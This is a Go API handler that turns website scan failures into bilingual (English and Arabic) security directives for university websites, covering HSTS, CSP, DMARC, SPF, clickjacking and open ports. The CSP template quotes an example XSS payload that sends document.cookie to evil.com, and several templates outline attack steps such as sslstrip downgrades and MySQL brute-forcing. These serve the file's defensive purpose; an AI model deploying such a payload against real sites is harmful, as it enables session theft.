package api

import (
	"fmt"
	"sort"
	"strings"

	"github.com/gofiber/fiber/v2"

	"seku/internal/config"
)

type Directive struct {
	ID          int      `json:"id"`
	Priority    string   `json:"priority"`
	Title       string   `json:"title"`
	TitleAr     string   `json:"title_ar"`
	Body        string   `json:"body"`
	BodyAr      string   `json:"body_ar"`
	Category    string   `json:"category"`
	AffectedPct float64  `json:"affected_pct"`
	Affected    int      `json:"affected"`
	TotalSites  int      `json:"total_sites"`
	Impact      string   `json:"impact"`
	Examples    []string `json:"examples"`
}

type directiveTemplate struct {
	CheckNames []string // match ANY of these check names
	Priority   string
	Title      string
	TitleAr    string
	Body       string
	BodyAr     string
	Category   string
	Impact     string
}

var directiveTemplates = []directiveTemplate{
	// ===== CRITICAL =====
	{
		CheckNames: []string{"HSTS"},
		Priority:   "critical",
		Title:      "Mandate HSTS (HTTP Strict Transport Security) on all university websites",
		TitleAr:    "إلزام جميع الجامعات بتفعيل بروتوكول HSTS",
		Body: `## Why This Is Critical
HSTS forces browsers to ONLY connect via HTTPS. Without it, an attacker on the same network (university WiFi, internet café) can perform a "downgrade attack" — intercepting the initial HTTP request before it redirects to HTTPS, and stealing all data including login credentials and personal information.

## How Attackers Exploit This
1. Attacker connects to the same WiFi network as students
2. Uses tools like "sslstrip" to intercept HTTP connections
3. Strips the HTTPS redirect, keeping the victim on plain HTTP
4. All passwords, student IDs, and personal data are captured in plain text
5. This attack takes less than 5 minutes to set up

## Required Action
Add this header to all web servers:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

## Implementation
- Cloudflare: SSL/TLS → Edge Certificates → Enable HSTS
- Apache: Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
- Nginx: add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;`,
		BodyAr: `## لماذا هذا حرج
بروتوكول HSTS يُجبر المتصفحات على الاتصال عبر HTTPS فقط. بدونه، يستطيع المهاجم المتصل بنفس شبكة WiFi (شبكة الجامعة أو المقهى) تنفيذ "هجوم تخفيض التشفير" — يعترض الطلب الأولي قبل التوجيه لـ HTTPS ويسرق جميع البيانات بما فيها كلمات المرور والمعلومات الشخصية.

## كيف يستغل المهاجم هذه الثغرة
1. يتصل المهاجم بنفس شبكة WiFi مع الطلاب
2. يستخدم أدوات مثل "sslstrip" لاعتراض اتصالات HTTP
3. يزيل إعادة التوجيه لـ HTTPS ويبقي الضحية على HTTP العادي
4. جميع كلمات المرور وأرقام الطلبة والبيانات الشخصية تُلتقط كنص واضح
5. هذا الهجوم يستغرق أقل من 5 دقائق لتنفيذه

## الإجراء المطلوب
إضافة هذه الترويسة لجميع السيرفرات:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

## المدة المحددة: 7 أيام`,
		Category: "headers",
		Impact:   "+50-100 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Content Security Policy"},
		Priority:   "critical",
		Title:      "Implement Content Security Policy (CSP) headers",
		TitleAr:    "تطبيق سياسة أمان المحتوى (CSP) على جميع المواقع الجامعية",
		Body: `## Why This Is Critical
CSP prevents Cross-Site Scripting (XSS) attacks — the #1 web vulnerability worldwide. Without CSP, an attacker can inject malicious JavaScript into university pages that steals student credentials, redirects to phishing sites, or installs malware.

## How Attackers Exploit This
1. Attacker finds an input field without proper sanitization (search box, comment form)
2. Injects JavaScript code: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
3. When other users visit the page, the script runs automatically
4. All session cookies and login tokens are sent to the attacker
5. Attacker now has full access to student/faculty accounts

## Required Action
Add a Content-Security-Policy header. Minimum recommended policy:
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;`,
		BodyAr: `## لماذا هذا حرج
سياسة CSP تمنع هجمات البرمجة عبر المواقع (XSS) — الثغرة الأولى عالمياً. بدون CSP، يستطيع المهاجم حقن كود JavaScript خبيث في صفحات الجامعة يسرق بيانات الطلاب أو يعيد توجيههم لمواقع تصيد أو يثبّت برامج ضارة.

## كيف يستغل المهاجم هذه الثغرة
1. يجد المهاجم حقل إدخال بدون تنقية (مربع بحث، نموذج تعليقات)
2. يحقن كود JavaScript يسرق ملفات تعريف الارتباط ويرسلها لسيرفر خارجي
3. عندما يزور مستخدمون آخرون الصفحة، يعمل الكود تلقائياً
4. جميع جلسات الدخول والمعلومات الشخصية تُرسل للمهاجم
5. المهاجم يحصل على وصول كامل لحسابات الطلبة والأساتذة

## الإجراء المطلوب
إضافة ترويسة Content-Security-Policy لجميع السيرفرات

## المدة المحددة: 14 يوم`,
		Category: "headers",
		Impact:   "+50-80 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"DMARC Record (Email Security)"},
		Priority:   "critical",
		Title:      "Mandatory DMARC policy for all university email domains",
		TitleAr:    "إلزام تطبيق سياسة DMARC لجميع نطاقات البريد الإلكتروني الجامعية",
		Body: `## Why This Is Critical
Without DMARC, anyone in the world can send emails that appear to come from your university's domain (e.g., dean@university.edu.iq). These spoofed emails are used in phishing attacks targeting students, faculty, and partner institutions.

## How Attackers Exploit This
1. Attacker crafts an email that appears from "registrar@university.edu.iq"
2. Sends to all students: "Your scholarship is at risk. Click here to verify your account"
3. Students trust the university domain and click the phishing link
4. They enter their credentials on a fake login page
5. Attacker now has access to student portals, grades, and personal data
6. This attack is trivially easy — takes 2 minutes with free tools

## Required Action
1. Add DMARC record: _dmarc.university.edu.iq TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@university.edu.iq"
2. Ensure SPF record exists and is correct
3. Configure DKIM signing on mail servers
4. Monitor DMARC reports and escalate to p=reject after 30 days`,
		BodyAr: `## لماذا هذا حرج
بدون DMARC، يستطيع أي شخص في العالم إرسال رسائل بريد إلكتروني تبدو وكأنها من نطاق جامعتك (مثلاً dean@university.edu.iq). هذه الرسائل المنتحلة تُستخدم في هجمات التصيد التي تستهدف الطلبة والأساتذة والمؤسسات الشريكة.

## كيف يستغل المهاجم هذه الثغرة
1. يُنشئ المهاجم بريداً يبدو من "registrar@university.edu.iq"
2. يرسل لجميع الطلبة: "منحتك الدراسية معرضة للخطر. انقر هنا للتحقق"
3. الطلبة يثقون بنطاق الجامعة وينقرون على رابط التصيد
4. يدخلون بياناتهم في صفحة تسجيل دخول مزورة
5. المهاجم يحصل على وصول لبوابة الطلبة والدرجات والبيانات الشخصية
6. هذا الهجوم سهل للغاية — يستغرق دقيقتين بأدوات مجانية

## الإجراء المطلوب
1. إضافة سجل DMARC: _dmarc.university.edu.iq TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@university.edu.iq"
2. التأكد من وجود سجل SPF صحيح
3. إعداد توقيع DKIM على سيرفرات البريد

## المدة المحددة: 14 يوم`,
		Category: "email_security",
		Impact:   "+80-120 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"SPF Record (Email Security)"},
		Priority:   "critical",
		Title:      "Configure SPF records for all university domains",
		TitleAr:    "إعداد سجلات SPF لجميع النطاقات الجامعية",
		Body: `## Why This Is Critical
SPF (Sender Policy Framework) specifies which mail servers are authorized to send email for your domain. Without it, spam filters cannot distinguish legitimate university emails from forged ones.

## How Attackers Exploit This
1. Attacker sends thousands of spam emails pretending to be from your university
2. Without SPF, receiving mail servers have no way to verify legitimacy
3. Your university domain gets blacklisted by Gmail, Yahoo, Outlook
4. Legitimate university emails start going to spam folders
5. Critical communications (admissions, grades, official notices) are lost

## Required Action
Add DNS TXT record: university.edu.iq TXT "v=spf1 include:_spf.google.com include:mail.university.edu.iq -all"`,
		BodyAr: `## لماذا هذا حرج
سجل SPF يحدد أي سيرفرات بريد مصرح لها بإرسال بريد نيابة عن نطاقك. بدونه، لا تستطيع فلاتر السبام التمييز بين البريد الجامعي الحقيقي والمزور.

## كيف يستغل المهاجم هذه الثغرة
1. يرسل المهاجم آلاف رسائل السبام منتحلاً نطاق جامعتك
2. بدون SPF، سيرفرات البريد المستقبلة لا تستطيع التحقق من المصدر
3. نطاق جامعتك يُدرج في القوائم السوداء عند Gmail وYahoo وOutlook
4. رسائل الجامعة الحقيقية تبدأ بالذهاب لمجلد السبام
5. اتصالات حرجة (قبول، درجات، إشعارات رسمية) تضيع

## الإجراء المطلوب
إضافة سجل DNS TXT: university.edu.iq TXT "v=spf1 include:_spf.google.com -all"

## المدة المحددة: 7 أيام`,
		Category: "dns",
		Impact:   "+40-60 نقطة لكل موقع",
	},

	// ===== HIGH =====
	{
		CheckNames: []string{"X-Frame-Options"},
		Priority:   "high",
		Title:      "Enable clickjacking protection on all university websites",
		TitleAr:    "تفعيل الحماية من هجمات الاختطاف البصري (Clickjacking) على جميع المواقع",
		Body: `## Why This Matters
Without X-Frame-Options, an attacker can embed the university website inside a hidden iframe on a malicious page. The victim thinks they're clicking a button on the malicious page, but they're actually clicking buttons on the hidden university site (changing passwords, transferring funds, approving actions).

## How Attackers Exploit This
1. Attacker creates a page: "Win a free iPhone — Click here!"
2. Behind the visible button, the university's "Change Password" page is loaded in a transparent iframe
3. Student clicks what they think is the "Win" button
4. They actually clicked "Confirm Password Change" on the university portal
5. Attacker now controls the student's account

## Required Action
Add header: X-Frame-Options: DENY (or SAMEORIGIN if embedding within own pages)`,
		BodyAr: `## لماذا هذا مهم
بدون X-Frame-Options، يستطيع المهاجم تضمين موقع الجامعة داخل إطار مخفي (iframe) في صفحة خبيثة. الضحية يظن أنه ينقر على زر في الصفحة الخبيثة، لكنه في الحقيقة ينقر أزرار على موقع الجامعة المخفي (تغيير كلمات المرور، الموافقة على إجراءات).

## كيف يستغل المهاجم هذه الثغرة
1. ينشئ المهاجم صفحة: "اربح هاتف مجاني — انقر هنا!"
2. خلف الزر المرئي، يتم تحميل صفحة "تغيير كلمة المرور" الجامعية في iframe شفاف
3. الطالب ينقر ما يظنه زر "اربح"
4. في الحقيقة نقر "تأكيد تغيير كلمة المرور" في بوابة الجامعة
5. المهاجم الآن يتحكم بحساب الطالب

## الإجراء المطلوب
إضافة ترويسة: X-Frame-Options: DENY

## المدة المحددة: 7 أيام`,
		Category: "headers",
		Impact:   "+30-50 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"X-XSS-Protection"},
		Priority:   "high",
		Title:      "Enable browser XSS protection filter",
		TitleAr:    "تفعيل فلتر حماية XSS في المتصفحات",
		Body: `## Why This Matters
The X-XSS-Protection header activates the browser's built-in XSS filter as a last line of defense. While CSP is more comprehensive, this header provides backward compatibility with older browsers.

## Required Action
Add header: X-XSS-Protection: 1; mode=block`,
		BodyAr: `## لماذا هذا مهم
ترويسة X-XSS-Protection تُفعّل فلتر XSS المدمج في المتصفح كخط دفاع أخير. وهي توفر توافقاً مع المتصفحات القديمة.

## الإجراء المطلوب
إضافة ترويسة: X-XSS-Protection: 1; mode=block

## المدة المحددة: 3 أيام`,
		Category: "headers",
		Impact:   "+20-30 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Permissions-Policy"},
		Priority:   "high",
		Title:      "Implement Permissions-Policy to control browser features",
		TitleAr:    "تطبيق سياسة الصلاحيات للتحكم بميزات المتصفح",
		Body: `## Why This Matters
Without Permissions-Policy, malicious scripts embedded in the page can access the camera, microphone, geolocation, and other sensitive browser features without user consent.

## How Attackers Exploit This
1. Attacker injects code via XSS or compromised third-party script
2. Code silently activates camera/microphone through the browser
3. Captures video/audio of students during online exams
4. Accesses geolocation to track student movements

## Required Action
Add header: Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`,
		BodyAr: `## لماذا هذا مهم
بدون سياسة الصلاحيات، يمكن لأكواد خبيثة مُحقنة الوصول للكاميرا والميكروفون والموقع الجغرافي بدون موافقة المستخدم.

## كيف يستغل المهاجم هذه الثغرة
1. يحقن المهاجم كوداً عبر XSS أو سكربت طرف ثالث مخترق
2. يُفعّل الكاميرا/الميكروفون بصمت عبر المتصفح
3. يلتقط فيديو/صوت للطلبة أثناء الامتحانات الإلكترونية
4. يصل للموقع الجغرافي لتتبع حركة الطلبة

## الإجراء المطلوب
إضافة ترويسة: Permissions-Policy: camera=(), microphone=(), geolocation=()

## المدة المحددة: 7 أيام`,
		Category: "headers",
		Impact:   "+30-50 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Referrer-Policy"},
		Priority:   "high",
		Title:      "Configure Referrer-Policy to protect user privacy",
		TitleAr:    "إعداد سياسة المُحيل لحماية خصوصية المستخدمين",
		Body: `## Why This Matters
Without Referrer-Policy, when a student clicks a link on the university site, the full URL (which may contain session tokens, student IDs, or search queries) is sent to the external site.

## How Attackers Exploit This
1. Attacker places a link on a university forum or comment section
2. Student clicks the link
3. The full university URL is sent as the "Referer" header to the attacker's site
4. URL may contain: session tokens, student IDs, grade page parameters
5. Attacker uses this information to hijack sessions or identify students

## Required Action
Add header: Referrer-Policy: strict-origin-when-cross-origin`,
		BodyAr: `## لماذا هذا مهم
بدون Referrer-Policy، عندما ينقر الطالب على رابط خارجي، يتم إرسال العنوان الكامل لصفحة الجامعة (الذي قد يحتوي على رموز جلسات أو أرقام طلبة) إلى الموقع الخارجي.

## كيف يستغل المهاجم هذه الثغرة
1. يضع المهاجم رابطاً في منتدى أو تعليقات الجامعة
2. الطالب ينقر الرابط
3. العنوان الكامل لصفحة الجامعة يُرسل كترويسة "Referer" لموقع المهاجم
4. العنوان قد يحتوي: رموز جلسات، أرقام طلبة، معلومات صفحة الدرجات
5. المهاجم يستخدم المعلومات لاختطاف الجلسات

## الإجراء المطلوب
إضافة ترويسة: Referrer-Policy: strict-origin-when-cross-origin

## المدة المحددة: 3 أيام`,
		Category: "headers",
		Impact:   "+20-30 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"CAA Record (Certificate Authority)"},
		Priority:   "high",
		Title:      "Add CAA DNS records to control SSL certificate issuance",
		TitleAr:    "إضافة سجلات CAA للتحكم بإصدار شهادات SSL",
		Body: `## Why This Matters
Without CAA records, any Certificate Authority can issue an SSL certificate for your domain. An attacker who compromises a CA can issue a valid certificate and perform man-in-the-middle attacks that are undetectable.

## Required Action
Add DNS CAA record: university.edu.iq CAA 0 issue "letsencrypt.org"`,
		BodyAr: `## لماذا هذا مهم
بدون سجلات CAA، أي جهة إصدار شهادات تستطيع إصدار شهادة SSL لنطاقك. مهاجم يخترق جهة إصدار يستطيع إصدار شهادة صالحة وتنفيذ هجمات اعتراض غير قابلة للكشف.

## الإجراء المطلوب
إضافة سجل DNS CAA: university.edu.iq CAA 0 issue "letsencrypt.org"

## المدة المحددة: 7 أيام`,
		Category: "dns",
		Impact:   "+20-30 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"WAF Detection"},
		Priority:   "high",
		Title:      "Deploy Web Application Firewall (WAF) for all university websites",
		TitleAr:    "نشر جدار حماية تطبيقات الويب (WAF) لجميع المواقع الجامعية",
		Body: `## Why This Is Critical
Without a WAF, university websites are directly exposed to automated attacks including SQL injection, XSS, brute-force, and DDoS attacks. A WAF acts as a shield between the internet and the web server.

## How Attackers Exploit This
1. Automated bots scan university websites for known vulnerabilities
2. Without WAF, malicious requests reach the server directly
3. SQL injection attacks can dump entire student databases
4. DDoS attacks can take the university offline during exam periods
5. Brute-force attacks can crack weak admin passwords

## Required Action
Enable Cloudflare (free tier available) or deploy ModSecurity:
- Cloudflare: Change nameservers to Cloudflare — free plan includes WAF
- ModSecurity: Install and enable OWASP Core Rule Set`,
		BodyAr: `## لماذا هذا حرج
بدون جدار حماية WAF، المواقع الجامعية معرضة مباشرة لهجمات آلية تشمل حقن SQL وXSS والقوة الغاشمة وهجمات DDoS. الـ WAF يعمل كدرع بين الإنترنت والسيرفر.

## كيف يستغل المهاجم هذه الثغرة
1. بوتات آلية تفحص مواقع الجامعات بحثاً عن ثغرات معروفة
2. بدون WAF، الطلبات الخبيثة تصل للسيرفر مباشرة
3. هجمات حقن SQL قادرة على تسريب قاعدة بيانات الطلبة بالكامل
4. هجمات DDoS توقف الجامعة عن العمل أثناء فترات الامتحانات
5. هجمات القوة الغاشمة تكسر كلمات مرور الإدارة الضعيفة

## الإجراء المطلوب
تفعيل Cloudflare (متوفر مجاناً) أو نشر ModSecurity:
- Cloudflare: تغيير nameservers إلى Cloudflare — الخطة المجانية تشمل WAF
- ModSecurity: تثبيت وتفعيل OWASP Core Rule Set

## المدة المحددة: 14 يوم`,
		Category: "waf",
		Impact:   "+200-400 نقطة لكل موقع",
	},

	// ===== MEDIUM =====
	{
		CheckNames: []string{"X-Content-Type-Options"},
		Priority:   "medium",
		Title:      "Enable MIME type sniffing protection",
		TitleAr:    "تفعيل حماية تزييف نوع المحتوى",
		Body: `## Why This Matters
Without X-Content-Type-Options: nosniff, browsers may "guess" the content type of files, potentially executing malicious files disguised as images or documents.

## Required Action
Add header: X-Content-Type-Options: nosniff`,
		BodyAr: `## لماذا هذا مهم
بدون ترويسة X-Content-Type-Options: nosniff، المتصفحات قد "تخمّن" نوع المحتوى وتنفذ ملفات خبيثة متنكرة كصور أو مستندات.

## الإجراء المطلوب
إضافة ترويسة: X-Content-Type-Options: nosniff

## المدة المحددة: 3 أيام`,
		Category: "headers",
		Impact:   "+20-30 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Structured Data"},
		Priority:   "medium",
		Title:      "Add structured data for better search engine visibility",
		TitleAr:    "إضافة البيانات المنظمة لتحسين ظهور الجامعة في محركات البحث",
		Body: `## Why This Matters
Structured data (Schema.org) helps Google and other search engines understand the university website's content, improving visibility in search results and knowledge panels.`,
		BodyAr: `## لماذا هذا مهم
البيانات المنظمة (Schema.org) تساعد Google ومحركات البحث الأخرى على فهم محتوى الموقع الجامعي، مما يحسّن الظهور في نتائج البحث.

## الإجراء المطلوب
إضافة علامات Schema.org التعليمية (EducationalOrganization) لصفحات الجامعة

## المدة المحددة: 30 يوم`,
		Category: "seo",
		Impact:   "+10-20 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Sitemap Accessibility"},
		Priority:   "medium",
		Title:      "Create and maintain XML sitemaps",
		TitleAr:    "إنشاء وصيانة خرائط الموقع XML",
		Body:       `Sitemaps help search engines discover and index university content efficiently.`,
		BodyAr:     "خرائط الموقع تساعد محركات البحث في اكتشاف وفهرسة محتوى الجامعة بكفاءة.\n\n## الإجراء المطلوب\nإنشاء ملف sitemap.xml وإضافته في robots.txt\n\n## المدة المحددة: 14 يوم",
		Category:   "seo",
		Impact:     "+10-15 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"HTTPS Enabled"},
		Priority:   "critical",
		Title:      "Mandatory HTTPS for all university websites",
		TitleAr:    "إلزام بروتوكول HTTPS لجميع المواقع الجامعية",
		Body: `## Why This Is Critical
Websites without HTTPS transmit ALL data in plain text. Passwords, personal information, and academic records can be intercepted by anyone on the network.

## Required Action
1. Obtain free SSL certificate from Let's Encrypt
2. Configure web server for HTTPS
3. Redirect all HTTP traffic to HTTPS`,
		BodyAr: `## لماذا هذا حرج
المواقع بدون HTTPS تنقل جميع البيانات كنص واضح. كلمات المرور والمعلومات الشخصية والسجلات الأكاديمية يمكن اعتراضها من أي شخص على الشبكة.

## الإجراء المطلوب
1. الحصول على شهادة SSL مجانية من Let's Encrypt
2. إعداد السيرفر لـ HTTPS
3. إعادة توجيه كل حركة HTTP إلى HTTPS

## المدة المحددة: 3 أيام`,
		Category: "ssl",
		Impact:   "+200-300 نقطة لكل موقع",
	},
	{
		CheckNames: []string{"Open Port Detection"},
		Priority:   "high",
		Title:      "Close all unnecessary network ports",
		TitleAr:    "إغلاق جميع المنافذ الشبكية غير الضرورية",
		Body: `## Why This Matters
Exposed database ports (MySQL 3306, PostgreSQL 5432) and admin ports (cPanel 2082, RDP 3389) allow attackers to directly access critical services.

## How Attackers Exploit This
1. Attacker scans for open ports using nmap
2. Finds MySQL port 3306 open to the internet
3. Brute-forces the database password (many use default "root" with no password)
4. Downloads the entire student database
5. Sells personal data on the dark web

## Required Action
Configure firewall (iptables/ufw) to block all ports except 80 (HTTP) and 443 (HTTPS)`,
		BodyAr: `## لماذا هذا مهم
المنافذ المكشوفة لقواعد البيانات (MySQL 3306) ولوحات الإدارة (cPanel 2082, RDP 3389) تسمح للمهاجمين بالوصول المباشر للخدمات الحرجة.

## كيف يستغل المهاجم هذه الثغرة
1. يفحص المهاجم المنافذ المفتوحة باستخدام nmap
2. يجد منفذ MySQL 3306 مفتوح للإنترنت
3. يُنفذ هجوم القوة الغاشمة على كلمة مرور قاعدة البيانات
4. يُحمّل قاعدة بيانات الطلبة بالكامل
5. يبيع البيانات الشخصية في الويب المظلم

## الإجراء المطلوب
إعداد جدار الحماية لحظر جميع المنافذ عدا 80 (HTTP) و 443 (HTTPS)

## المدة المحددة: 7 أيام`,
		Category: "ports",
		Impact:   "+100-200 نقطة لكل موقع",
	},
}

func GenerateDirectives(c *fiber.Ctx) error {
	type TargetCheck struct {
		TargetURL  string
		TargetName string
		CheckName  string
		Category   string
		Status     string
	}

	var checks []TargetCheck
	config.DB.Raw(`
		SELECT st.url AS target_url, st.name AS target_name,
		       cr.check_name, cr.category, cr.status
		FROM check_results cr
		INNER JOIN scan_results sr ON sr.id = cr.scan_result_id
		INNER JOIN scan_targets st ON st.id = sr.scan_target_id
		INNER JOIN (
			SELECT scan_target_id, MAX(id) AS max_id
			FROM scan_results WHERE status = 'completed'
			GROUP BY scan_target_id
		) latest ON sr.id = latest.max_id
		WHERE cr.status IN ('fail', 'warn')
	`).Scan(&checks)

	var totalSites int64
	config.DB.Raw(`SELECT COUNT(DISTINCT scan_target_id) FROM scan_results WHERE status = 'completed'`).Scan(&totalSites)

	if totalSites == 0 {
		return c.JSON(fiber.Map{"total_sites": 0, "directives": []Directive{}, "message": "No scan results. Run scans first."})
	}

	// Count affected sites per check name
	type siteSet struct {
		sites map[string]bool
		names []string
	}
	issueMap := map[string]*siteSet{}
	for _, ch := range checks {
		if _, ok := issueMap[ch.CheckName]; !ok {
			issueMap[ch.CheckName] = &siteSet{sites: map[string]bool{}}
		}
		ss := issueMap[ch.CheckName]
		if !ss.sites[ch.TargetURL] {
			ss.sites[ch.TargetURL] = true
			name := ch.TargetName
			if name == "" {
				name = ch.TargetURL
			}
			if len(ss.names) < 5 {
				ss.names = append(ss.names, name)
			}
		}
	}

	var directives []Directive
	for _, tmpl := range directiveTemplates {
		// Find the best matching check name
		bestCount := 0
		var bestNames []string
		for _, cn := range tmpl.CheckNames {
			// Exact match
			if ss, ok := issueMap[cn]; ok && len(ss.sites) > bestCount {
				bestCount = len(ss.sites)
				bestNames = ss.names
			}
			// Partial match
			for key, ss := range issueMap {
				if strings.Contains(key, cn) && len(ss.sites) > bestCount {
					bestCount = len(ss.sites)
					bestNames = ss.names
				}
			}
		}

		if bestCount == 0 {
			continue
		}

		pct := float64(bestCount) / float64(totalSites) * 100
		if pct < 5 { // lower threshold to 5%
			continue
		}

		directives = append(directives, Directive{
			Priority:    tmpl.Priority,
			Title:       tmpl.Title,
			TitleAr:     tmpl.TitleAr,
			Body:        tmpl.Body,
			BodyAr:      tmpl.BodyAr,
			Category:    tmpl.Category,
			AffectedPct: pct,
			Affected:    bestCount,
			TotalSites:  int(totalSites),
			Impact:      tmpl.Impact,
			Examples:    bestNames,
		})
	}

	// Sort: critical first, then by affected %
	priorityOrder := map[string]int{"critical": 0, "high": 1, "medium": 2}
	sort.Slice(directives, func(i, j int) bool {
		pi, pj := priorityOrder[directives[i].Priority], priorityOrder[directives[j].Priority]
		if pi != pj {
			return pi < pj
		}
		return directives[i].AffectedPct > directives[j].AffectedPct
	})

	for i := range directives {
		directives[i].ID = i + 1
	}

	criticalCount, highCount, mediumCount := 0, 0, 0
	for _, d := range directives {
		switch d.Priority {
		case "critical":
			criticalCount++
		case "high":
			highCount++
		case "medium":
			mediumCount++
		}
	}

	return c.JSON(fiber.Map{
		"total_sites":    totalSites,
		"total_issues":   len(checks),
		"directives":     directives,
		"critical_count": criticalCount,
		"high_count":     highCount,
		"medium_count":   mediumCount,
		"generated_at":   fmt.Sprintf("Auto-generated from %d scan results", totalSites),
	})
}
